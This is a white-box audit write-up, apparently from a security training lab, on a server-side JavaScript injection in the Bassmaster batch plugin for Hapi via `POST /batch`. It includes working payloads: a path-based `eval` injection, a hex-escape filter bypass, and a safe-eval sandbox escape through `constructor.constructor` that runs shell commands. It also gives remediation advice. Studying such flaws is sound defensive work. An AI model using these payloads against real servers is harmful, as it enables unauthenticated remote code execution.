This article documents a white-box audit of Bassmaster <= 1.5.1. Bassmaster is a batch request plugin for the Hapi framework. The vulnerability sits in the request chaining logic exposed by `POST /batch`: attacker-controlled `requests[].path` values are parsed as reference fields and eventually concatenated into `eval()`. This enables Server-Side JavaScript Injection and can be escalated to RCE inside the Node.js runtime. The final section also covers why the Extra Mile version remains exploitable even after replacing `eval` with `safe-eval`.


# Vulnerability Overview

- Product: Bassmaster
- Version: Bassmaster <= 1.5.1
- Vulnerability type: Server-Side JavaScript Injection
- Entry URL: `POST /batch`
- Controllable parameter: `requests[].path`
- Authentication requirement: unauthenticated
- Trigger location: `lib/batch.js -> internals.batch()`
- Dangerous function: `eval()`
- Final impact: arbitrary JavaScript execution -> Node.js RCE -> Reverse Shell


# Audit Entry Point

Bassmaster is a batch request plugin for Hapi. A good starting point is the plugin registration logic:

```js
exports.register = function (pack, options, next) {

    pack.route({
        method: 'POST',
        path: settings.batchEndpoint,
        config: Batch.config(settings)
    });

    next();
};
```

The default registered endpoint is:

```http
POST /batch
```

All requests eventually enter:

```js
Batch.config()
```

The relevant file is:

```text
lib/batch.js
```

## Locating the Dangerous Function

Start by searching for common dynamic execution primitives:

```text
eval(
Function(
vm.runInContext(
```

![[Pasted image 20260608202405.png]]

The following code stands out:

```js
eval('value = ref.' + parts[i].value + ';');
```

Full context:

```js
if (ref) {
    var value = null;

    try {
        eval('value = ref.' + parts[i].value + ';');
    }
    catch (e) {
        error = new Error(e.message);
    }
}
```

Here, `parts[i].value` is passed directly into `eval()`, which is a clear code execution sink.

## Tracing the Source of parts

Trace the call chain upward:

```js
internals.batch(
    request,
    resultsData,
    pos,
    parts,
    callback
)
```

Call site:

```js
callBatch(i, parts)
```

Continue tracing:

```js
var parts = requests[i];
```

The source is:

```js
var result =
request.payload.requests[i].path.replace(
    requestRegex,
    parseRequest
);
```

This confirms that:

```js
request.payload.requests[i].path
```

comes from user input.


# Root Cause

## User Input Reaches eval

An attacker controls request data like this:

```json
{
    "requests":[
        {
            "path":"/item/$1.id"
        }
    ]
}
```

After `parseRequest()`, it is parsed into:

```js
parts.push({
    type: 'ref',
    index: $1,
    value: $2
});
```

Eventually:

```js
parts[i].value
```

reaches:

```js
eval()
```

The final expression becomes:

```js
eval(
    'value = ref.' + user_input
);
```

## Why This Executes Code

Bassmaster intended to implement reference syntax like:

```text
/item/$1.id
```

For example, if a previous request returns:

```json
{
    "id": "123"
}
```

The plugin converts `$1.id` into:

```js
ref.id
```

The developer used `eval()` to dynamically read the property:

```js
eval(
    'value = ref.id'
);
```

The problem is that `eval()` does more than property access; it can execute arbitrary JavaScript. Therefore, a payload like:

```js
ref.id;PAYLOAD
```

causes the payload to execute.


# Exploitation Conditions

The full exploit chain requires:

1. The target exposes `POST /batch`.
2. Request chaining is enabled.
3. `$1.xxx` reference syntax is supported.
4. The dangerous `eval()` call still exists.
5. User input is not properly filtered or safely parsed.


# Exploitation Path

## Stage 1: Validate Batch Processing

Official example request:

```json
{
  "requests":[
    {
      "method":"get",
      "path":"/profile"
    },
    {
      "method":"get",
      "path":"/item"
    },
    {
      "method":"get",
      "path":"/item/$1.id"
    }
  ]
}
```

Example response:

```json
[
  {
    "id":"fa0dbda9b1b"
  },
  {
    "id":"55cf687663"
  },
  {
    "id":"55cf687663"
  }
]
```

This confirms that:

```text
$1.id
```

successfully references the result from the second request.

## Stage 2: Analyze Filtering Rules

The path parser uses this regex:

```js
/(?:\/)(?:\$(\d)+\.)?([^\/\$]*)/g
```

It restricts:

```text
/
$
```

But still allows:

```text
;
(
)
'
"
.
,
```

Therefore:

```text
;PAYLOAD
```

can pass validation and reach the execution path.

## Stage 3: Validate JavaScript Execution

Use this path:

```json
{
  "method":"get",
  "path":"/item/$1.id;require('util').log('CODE_EXECUTION');"
}
```

Inside `eval()`, it becomes:

```js
eval(
    'value = ref.id;require("util").log("CODE_EXECUTION");'
);
```

After successful execution, the server console prints:

```bash
student@bassmaster:~$ ls
bassmaster            Desktop    Downloads  Pictures  Templates
bassmaster_extramile  Documents  Music      Public    Videos
student@bassmaster:~$ cd bassmaster
student@bassmaster:~/bassmaster$ ls
CONTRIBUTING.md  images    lib      Makefile      package.json  test
examples         index.js  LICENSE  node_modules  README.md
student@bassmaster:~/bassmaster$ nodejs examples/batch.js
Server started.
8 Jun 02:31:46 - CODE_EXECUTION
```


# Payload Construction

## Validate Code Execution

Payload:

```js
require('util').log('CODE_EXECUTION');
```

Final request:

```http
POST /batch
```

```json
{
    "requests":[
        {
            "method":"get",
            "path":"/profile"
        },
        {
            "method":"get",
            "path":"/item"
        },
        {
            "method":"get",
            "path":"/item/$1.id;require('util').log('CODE_EXECUTION');"
        }
    ]
}
```

Server console:

```text
CODE_EXECUTION
```

## Bypassing Character Restrictions

Using:

```js
/bin/bash
```

directly fails because `/` is treated as a path separator by the regex. For example:

```js
/bin/bash
```

is split into:

```text
bin
bash
```

As a result, it cannot reach `eval()` intact.

## Hex Encoding Bypass

Use JavaScript hex escapes:

```js
\x2fbin\x2fbash
```

instead of:

```js
/bin/bash
```

This bypasses the path parsing restriction.


# Final Exploit Chain

```text
HTTP POST
    ↓
/batch
    ↓
request.payload.requests
    ↓
parseRequest()
    ↓
parts[]
    ↓
internals.process()
    ↓
internals.batch()
    ↓
eval()
    ↓
Arbitrary JavaScript Execution
    ↓
Node.js Runtime
    ↓
child_process
    ↓
RCE
```


# Remediation

## Do Not Use eval

Do not use:

```js
eval(
    'value = ref.' + userInput
);
```

Use bracket access instead:

```js
value = ref[userInput];
```

Or use a safe path reader:

```js
lodash.get(ref, path);
```

## Use a Property Allowlist

Only allow expected fields such as:

```js
id
name
project
```

Do not allow arbitrary property access.

## Avoid Pseudo-Safe Sandboxes

Do not blindly trust:

```js
safe-eval
vm.runInContext
vm.runInNewContext
```

All user input must be treated as untrusted. A sandbox can provide extra isolation, but it cannot replace validation and secure design.

## Upgrade

Upgrade to the official fixed version and fully remove:

```js
eval()
```

related logic.


# Extra Mile: safe-eval Is Still Escapable

## Background

The original Bassmaster version used:

```js
eval(
    'value = ref.' + parts[i].value + ';'
);
```

This leads to direct JavaScript Injection.

In the Extra Mile version, the developer attempted to fix the issue with `safe-eval`:

```js
var eval = require('safe-eval');

var context = {
    ref: ref,
    value: value,
    parts: parts,
    i: i
};

value = eval(
    'ref.' + parts[i].value + ';',
    context
);
```

The assumed model was:

```text
eval()
    ↓
safe-eval()
    ↓
safe
```

That assumption is wrong.

## How safe-eval Works

`safe-eval` does not implement a new JavaScript interpreter. Its core implementation relies on:

```js
vm.runInNewContext()
```

Inside `bassmaster_extramile/node_modules/safe-eval/index.js`, the core code is:

```js
var vm = require('vm')

module.exports = function safeEval (code, context, opts) {
  var sandbox = {}
  ...
  if (context) {
    Object.keys(context).forEach(function (key) {
      sandbox[key] = context[key]
    })
  }

  vm.runInNewContext(code, sandbox, opts)
  return sandbox[resultKey]
}
```

The `sandbox` object is created by `safe-eval`. `vm.runInNewContext(code, sandbox)` means: execute the JavaScript code in a new context and use `sandbox` as the global object.

```text
User code
    ↓
vm.runInNewContext()
    ↓
sandbox
```

## The Problem

The developer places `ref` directly into the sandbox:

```js
var context = {
    ref: ref
};
```

But `ref` is a normal object from the host Node.js environment. Therefore, an attacker can still access:

```js
ref.constructor
```

Then:

```js
ref.constructor.constructor
```

Finally, this reaches:

```js
Function
```

By walking two `constructor` properties, the attacker obtains the host environment's `Function` constructor. That constructor compiles and executes code in the host context, which means it can regain access to Node.js `process`.

## Sandbox Escape

Once `Function` is obtained, the payload can return to the host environment:

```text
ref
    ↓
constructor
    ↓
constructor
    ↓
Function
    ↓
process
    ↓
mainModule
    ↓
require()
    ↓
child_process
    ↓
exec()
```

This forms:

```text
safe-eval Sandbox Escape
```

## Filtering Constraints

Bassmaster still uses:

```js
/(?:\/)(?:\$(\d)+\.)?([^\/\$]*)/g
```

for path parsing. Therefore, these characters cannot appear directly in the payload:

```text
/
$
```

For example:

```js
/var/www
/bin/bash
```

will be split by the regex.

### Bypass

Use JavaScript hex escapes:

```js
\x2f
```

to represent:

```text
/
```

For example:

```js
\x2fbin\x2fbash
```

is equivalent at runtime to:

```text
/bin/bash
```

The same applies to:

```js
\x2ftmp
\x2fetc
\x2fdev
```

## Return Value Restrictions

`batch.js` also contains this extra check:

```js
if (
    value.match &&
    value.match(/^[\w:]+$/)
)
{
    path += value;
}
```

Therefore, the return value after `eval()` must satisfy:

```text
^[\w:]+$
```

### Bad Return Values

Values such as:

```js
Buffer
Object
Error
hello world
/tmp/test
```

may cause:

```text
500 Internal Server Error
```

### Good Return Value

Returning:

```js
OK
```

is usually enough. For example:

```js
return 'OK';
```

## RCE Validation

Construct:

```js
constructor.constructor(
"process.mainModule.require('child_process').exec('id > \\x2ftmp\\x2frce'); return \"OK\"'"
)()
```

After execution, the following file is created:

```text
/tmp/rce
```

Its contents:

```text
uid=1000(student)
gid=1000(student)
```

confirm that command execution occurred on the target.

## Extra Mile Final Exploit Chain

```text
HTTP POST
    ↓
/batch
    ↓
request.payload.requests
    ↓
parseRequest()
    ↓
parts[]
    ↓
safe-eval()
    ↓
ref
    ↓
constructor
    ↓
constructor
    ↓
Function
    ↓
process.mainModule
    ↓
require()
    ↓
child_process
    ↓
exec()
    ↓
RCE
```

## Extra Mile Summary

The developer attempted to fix the issue by replacing:

```text
eval()
    ↓
safe-eval()
```

But:

```text
safe-eval != safe sandbox
```

Because `ref` still comes from the host environment, an attacker can use:

```js
ref.constructor.constructor
```

to obtain:

```js
Function
```

Then escape:

```text
vm sandbox
```

and regain:

```text
Node.js Runtime
```

As a result, Bassmaster Extra Mile is still:

```text
Server-Side JavaScript Injection
    ↓
Sandbox Escape
    ↓
Node.js RCE
```

The chain changes from:

```text
eval()
```

to:

```text
safe-eval()
    ↓
constructor.constructor
    ↓
Function
    ↓
child_process
```
